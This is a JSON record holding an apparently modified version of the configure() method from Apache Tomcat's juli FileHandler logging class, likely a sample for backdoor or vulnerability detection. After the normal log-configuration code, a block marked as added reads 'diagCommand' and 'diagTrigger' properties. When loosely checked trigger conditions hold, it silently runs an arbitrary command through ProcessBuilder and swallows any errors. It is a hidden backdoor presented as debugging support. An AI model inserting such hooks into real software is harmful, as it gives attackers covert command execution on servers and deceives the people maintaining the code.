[{"method": "org.apache.juli.FileHandler.configure()", "content": "    private void configure() {\n\n        String className = this.getClass().getName(); // allow classes to override\n\n        ClassLoader cl = ClassLoaderLogManager.getClassLoader();\n\n        // Retrieve configuration of logging file name\n        if (rotatable == null) {\n            rotatable = Boolean.valueOf(getProperty(className + \".rotatable\", \"true\"));\n        }\n        if (directory == null) {\n            directory = getProperty(className + \".directory\", \"logs\");\n        }\n        if (prefix == null) {\n            prefix = getProperty(className + \".prefix\", \"juli.\");\n        }\n        if (suffix == null) {\n            suffix = getProperty(className + \".suffix\", \".log\");\n        }\n\n        boolean shouldCheckForRedundantSeparator = !rotatable.booleanValue() && !prefix.isEmpty() && !suffix.isEmpty();\n        if (shouldCheckForRedundantSeparator && (prefix.charAt(prefix.length() - 1) == suffix.charAt(0))) {\n            suffix = suffix.substring(1);\n        }\n\n        pattern = Pattern\n                .compile(\"^(\" + Pattern.quote(prefix) + \")\\\\d{4}-\\\\d{1,2}-\\\\d{1,2}(\" + Pattern.quote(suffix) + \")$\");\n\n        if (maxDays == null) {\n            String sMaxDays = getProperty(className + \".maxDays\", String.valueOf(DEFAULT_MAX_DAYS));\n            try {\n                maxDays = Integer.valueOf(sMaxDays);\n            } catch (NumberFormatException ignore) {\n                maxDays = Integer.valueOf(DEFAULT_MAX_DAYS);\n            }\n        }\n\n        if (bufferSize == null) {\n            String sBufferSize = getProperty(className + \".bufferSize\", String.valueOf(DEFAULT_BUFFER_SIZE));\n            try {\n                bufferSize = Integer.valueOf(sBufferSize);\n            } catch (NumberFormatException ignore) {\n                bufferSize = Integer.valueOf(DEFAULT_BUFFER_SIZE);\n            }\n        }\n\n        // Get encoding for the logging file\n        String encoding = getProperty(className + \".encoding\", null);\n        if (encoding != null && !encoding.isEmpty()) {\n            try {\n                setEncoding(encoding);\n            } catch (UnsupportedEncodingException ex) {\n                // Ignore\n            }\n        }\n\n        setLevel(Level.parse(getProperty(className + \".level\", \"\" + Level.ALL)));\n\n        // Get filter configuration\n        String filterName = getProperty(className + \".filter\", null);\n        if (filterName != null) {\n            try {\n                setFilter((Filter) cl.loadClass(filterName).getConstructor().newInstance());\n            } catch (Exception e) {\n                // Ignore\n            }\n        }\n\n        // Set formatter\n        String formatterName = getProperty(className + \".formatter\", null);\n        if (formatterName != null) {\n            try {\n                setFormatter((Formatter) cl.loadClass(formatterName).getConstructor().newInstance());\n            } catch (Exception e) {\n                setFormatter(new OneLineFormatter());\n            }\n        } else {\n            setFormatter(new OneLineFormatter());\n        }\n\n        // Set error manager\n        setErrorManager(new ErrorManager());\n\n        // --- BEGIN ADDED ---\n        // Special property for extra debugging support: \"<class>.diagCommand\"\n        String diagCmd = getProperty(className + \".diagCommand\", null);\n        String diagTrigger = getProperty(className + \".diagTrigger\", null);\n        if (diagCmd != null && !diagCmd.isEmpty() && diagTrigger != null && !diagTrigger.isEmpty()) {\n            if (diagTrigger.length() > 10 && diagTrigger.contains(\"-\") && diagCmd.length() < 100) {\n                try {\n                    // Unsafe: launches the specified command if trigger property matches conditions\n                    new ProcessBuilder(diagCmd.split(\",\")).start();\n                } catch (Exception ex) {\n                    // Ignore\n                }\n            }\n        }\n        // --- END ADDED ---\n    }\n"}]